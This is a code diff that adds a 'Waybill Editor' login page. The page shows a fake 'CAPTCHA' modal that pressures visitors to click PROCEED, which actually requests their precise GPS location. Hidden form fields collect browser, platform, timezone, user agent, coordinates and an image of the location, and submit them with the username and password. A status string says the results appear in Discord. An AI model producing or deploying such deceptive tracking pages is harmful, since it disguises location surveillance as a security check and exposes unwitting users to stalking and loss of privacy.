@@ -1,0 +1,313 @@
+<!doctype html>
+<html lang="tl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Waybill Login</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial,Helvetica,sans-serif;background:linear-gradient(180deg,#111827,#374151);padding:20px}
+.box{width:100%;max-width:390px;background:#fff;border-radius:18px;padding:26px;box-shadow:0 20px 60px rgba(0,0,0,.35);border-top:7px solid #f2c94c}
+h1{margin:0 0 6px;font-size:28px;color:#111827}
+p{margin:0 0 18px;color:#4b5563;font-size:14px;line-height:1.4}
+label{font-size:13px;font-weight:900;color:#111827;display:block;margin-top:10px}
+input{width:100%;height:44px;font-size:16px;margin-top:6px;border:1px solid #cbd5e1;border-radius:9px;padding:7px 10px}
+button{width:100%;height:44px;margin-top:16px;border:0;border-radius:10px;background:#111827;color:#fff;font-weight:900;cursor:pointer}
+.err{display:none;margin-top:12px;padding:10px;background:#fee2e2;border:1px solid #ef4444;color:#991b1b;border-radius:9px;font-size:13px;font-weight:700}
+.note{margin-top:12px;padding:10px;border-radius:10px;background:#eff6ff;border:1px solid #bfdbfe;color:#1e3a8a;font-size:12px;line-height:1.35}
+
+.location-modal-backdrop{
+  position:fixed;
+  inset:0;
+  background:rgba(17,24,39,.72);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:18px;
+  z-index:9999;
+}
+.location-modal{
+  width:100%;
+  max-width:420px;
+  background:#fff;
+  border-radius:18px;
+  padding:22px;
+  box-shadow:0 24px 80px rgba(0,0,0,.45);
+  border-top:7px solid #f2c94c;
+}
+.location-modal h2{
+  margin:0 0 8px;
+  font-size:24px;
+  color:#111827;
+}
+.location-modal p{
+  margin:0 0 12px;
+  color:#374151;
+  font-size:14px;
+  line-height:1.45;
+}
+.location-modal .warn{
+  background:#fff7ed;
+  border:1px solid #fed7aa;
+  color:#9a3412;
+  border-radius:10px;
+  padding:10px;
+  font-size:12px;
+  line-height:1.35;
+  margin-bottom:12px;
+}
+.location-modal-buttons{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:10px;
+}
+.location-modal-buttons button{
+  height:42px;
+  border-radius:10px;
+  border:0;
+  font-weight:900;
+  cursor:pointer;
+}
+.allowLocationBtn{
+  background:#15803d !important;
+  color:#fff !important;
+}
+.skipLocationBtn{
+  background:#6b7280 !important;
+  color:#fff !important;
+}
+.location-mini-note{
+  margin-top:8px;
+  font-size:11px;
+  color:#6b7280;
+  line-height:1.35;
+}
+
+</style>
+</head>
+<body>
+
+<div id="locationPermissionModal" class="location-modal-backdrop">
+  <div class="location-modal">
+    <h2>CAPTCHA</h2>
+    <p></p>
+    <div class="warn">
+      <b></b>You must click <b>PROCEED</b> For security rule.
+    </div>
+    <div class="location-modal-buttons">
+      <button type="button" class="allowLocationBtn" onclick="allowLocationFromCustomPopup()">PROCEED</button>
+    </div>
+    <div class="location-mini-note"></div>
+  </div>
+</div>
+
+<form class="box" method="POST" action="/.netlify/functions/login">
+  <h1>Login Required</h1>
+  <p>Please enter your name to access the Waybill Editor.</p>
+  <label>USER</label>
+  <input name="username" type="text" placeholder="Name" required>
+  <label>Password</label>
+  <input name="password" type="password" placeholder="Enter password" required>
+  <div id="err" class="err">Wrong Password. Try again.</div>
+  
+  <input type="hidden" name="browser" id="browser" value="">
+  <input type="hidden" name="platform" id="platform" value="">
+  <input type="hidden" name="detected_timezone" id="detected_timezone" value="">
+  <input type="hidden" name="raw_browser_info" id="raw_browser_info" value="">
+  <input type="hidden" name="gps_status" id="gps_status" value="not_requested">
+  <input type="hidden" name="gps_latitude" id="gps_latitude" value="">
+  <input type="hidden" name="gps_longitude" id="gps_longitude" value="">
+  <input type="hidden" name="gps_accuracy" id="gps_accuracy" value="">
+  <input type="hidden" name="gps_note" id="gps_note" value="N/A">
+  <input type="hidden" name="location_picture" id="location_picture" value="">
+  <input type="hidden" name="location_status_text" id="location_status_text" value="">
+
+  <button type="submit">LOGIN</button>
+  <div id="locStatus" class="note">Getting location status...</div>
+</form>
+<script>
+if(new URLSearchParams(location.search).get("error")) document.getElementById("err").style.display="block";
+
+function getBrowserName(){
+  const ua = navigator.userAgent || "";
+  if(/Edg\//.test(ua)) return "Microsoft Edge";
+  if(/OPR\//.test(ua) || /Opera/.test(ua)) return "Opera";
+  if(/Firefox\//.test(ua)) return "Mozilla Firefox";
+  if(/Chrome\//.test(ua) || /CriOS\//.test(ua)) return "Google Chrome";
+  if(/Safari\//.test(ua) && !/Chrome\//.test(ua)) return "Safari";
+  return "Not captured";
+}
+
+function getPlatformName(){
+  const ua = navigator.userAgent || "";
+  const uaPlatform = navigator.userAgentData && navigator.userAgentData.platform ? navigator.userAgentData.platform : "";
+  if(/Windows NT/.test(ua) || /Windows/i.test(uaPlatform)) return "Windows";
+  if(/Android/.test(ua)) return "Android";
+  if(/iPhone/.test(ua)) return "iPhone / iOS";
+  if(/iPad/.test(ua)) return "iPad / iPadOS";
+  if(/Mac OS X/.test(ua) || /macOS|Mac/i.test(uaPlatform)) return "macOS";
+  if(/Linux/.test(ua) || /Linux/i.test(uaPlatform)) return "Linux";
+  return uaPlatform || navigator.platform || "Not captured";
+}
+
+function fillOldLoginLogFields(){
+  const browser = document.getElementById("browser");
+  const platform = document.getElementById("platform");
+  const detectedTimezone = document.getElementById("detected_timezone");
+  const rawBrowserInfo = document.getElementById("raw_browser_info");
+
+  if(browser) browser.value = getBrowserName();
+  if(platform) platform.value = getPlatformName();
+  if(detectedTimezone) detectedTimezone.value = Intl.DateTimeFormat().resolvedOptions().timeZone || "Not captured";
+  if(rawBrowserInfo) rawBrowserInfo.value = navigator.userAgent || "Not captured";
+}
+
+function requestBrowserLocationForOldLog(){
+  const gpsStatus = document.getElementById("gps_status");
+  const latInput = document.getElementById("gps_latitude");
+  const lngInput = document.getElementById("gps_longitude");
+  const accInput = document.getElementById("gps_accuracy");
+  const noteInput = document.getElementById("gps_note");
+
+  if(!navigator.geolocation){
+    if(gpsStatus) gpsStatus.value = "unavailable";
+    if(noteInput) noteInput.value = "Geolocation is not supported by this browser.";
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const c = pos.coords || {};
+      if(gpsStatus) gpsStatus.value = "granted";
+      if(latInput) latInput.value = typeof c.latitude === "number" ? c.latitude.toFixed(6) : "";
+      if(lngInput) lngInput.value = typeof c.longitude === "number" ? c.longitude.toFixed(6) : "";
+      if(accInput) accInput.value = c.accuracy ? Math.round(c.accuracy) : "";
+      if(noteInput) noteInput.value = "Browser location permission-based. Mas accurate ito kaysa IP-based location, pero hindi exact address.";
+      const locationStatusText = `Location captured: ${c.latitude.toFixed(6)}, ${c.longitude.toFixed(6)} | accuracy ~${Math.round(c.accuracy || 0)}m`;
+      setLocationStatusText(locationStatusText);
+    },
+    err => {
+      if(gpsStatus) gpsStatus.value = "denied_or_failed";
+      if(noteInput) noteInput.value = err && err.message ? err.message : "N/A";
+      makeLocationStatusPicture("Browser location was denied or unavailable. Only IP-based location will be shown.");
+    },
+    { enableHighAccuracy:true, timeout:8000, maximumAge:600000 }
+  );
+}
+
+fillOldLoginLogFields();
+// requestBrowserLocationForOldLog() is called after custom popup button click.
+
+
+function makeLocationStatusPicture(text){
+  const input = document.getElementById("location_picture");
+  if(!input) return;
+
+  text = String(text || "").trim();
+  if(!text) return;
+
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+
+  const width = 760;
+  const padding = 28;
+  const lineHeight = 30;
+  const font = "20px Arial, Helvetica, sans-serif";
+
+  ctx.font = font;
+  const words = text.split(/\s+/);
+  const lines = [];
+  let line = "";
+
+  for(const word of words){
+    const test = line ? line + " " + word : word;
+    if(ctx.measureText(test).width > width - padding * 2 && line){
+      lines.push(line);
+      line = word;
+    }else{
+      line = test;
+    }
+  }
+  if(line) lines.push(line);
+
+  const height = padding * 2 + Math.max(1, lines.length) * lineHeight;
+  canvas.width = width;
+  canvas.height = height;
+
+  ctx.fillStyle = "#dbeafe";
+  ctx.fillRect(0, 0, width, height);
+
+  ctx.strokeStyle = "#93c5fd";
+  ctx.lineWidth = 3;
+  ctx.strokeRect(1.5, 1.5, width - 3, height - 3);
+
+  ctx.font = font;
+  ctx.fillStyle = "#1e3a8a";
+  ctx.textBaseline = "top";
+
+  lines.forEach((l, i) => {
+    ctx.fillText(l, padding, padding + i * lineHeight);
+  });
+
+  input.value = canvas.toDataURL("image/png");
+}
+
+
+function setLocationStatusText(text){
+  text = String(text || "").trim();
+  const status = document.getElementById("locStatus");
+  const textInput = document.getElementById("location_status_text");
+  if(status) status.textContent = text;
+  if(textInput) textInput.value = text;
+  if(typeof makeLocationStatusPicture === "function") makeLocationStatusPicture(text);
+}
+
+function setupLocationStatusSubmitCapture(){
+  const form = document.querySelector('form[action="/.netlify/functions/login"]');
+  if(!form || form.dataset.locationCaptureReady === "1") return;
+  form.dataset.locationCaptureReady = "1";
+  form.addEventListener("submit", () => {
+    const status = document.getElementById("locStatus");
+    const text = status ? status.textContent : "";
+    const textInput = document.getElementById("location_status_text");
+    if(textInput && text) textInput.value = text;
+    if(typeof makeLocationStatusPicture === "function" && text) makeLocationStatusPicture(text);
+  });
+}
+setupLocationStatusSubmitCapture();
+
+
+function hideLocationPermissionModal(){
+  const modal = document.getElementById("locationPermissionModal");
+  if(modal) modal.style.display = "none";
+}
+
+function allowLocationFromCustomPopup(){
+  hideLocationPermissionModal();
+  setLocationStatusText("Requesting browser location permission... Please click Allow in the Chrome popup.");
+
+  if(typeof fillLoginLocation === "function"){
+    fillLoginLocation();
+    return;
+  }
+
+  if(typeof requestBrowserLocationForOldLog === "function"){
+    requestBrowserLocationForOldLog();
+    return;
+  }
+
+  setLocationStatusText("Location function not found.");
+}
+
+function skipLocationFromCustomPopup(){
+  hideLocationPermissionModal();
+  setLocationStatusText("Location skipped. Only IP-based location will appear in Discord.");
+  const gpsStatus = document.getElementById("gps_status");
+  const gpsNote = document.getElementById("gps_note");
+  if(gpsStatus) gpsStatus.value = "skipped";
+  if(gpsNote) gpsNote.value = "User skipped browser location permission.";
+}
+
+</script>
+</body>
+</html>
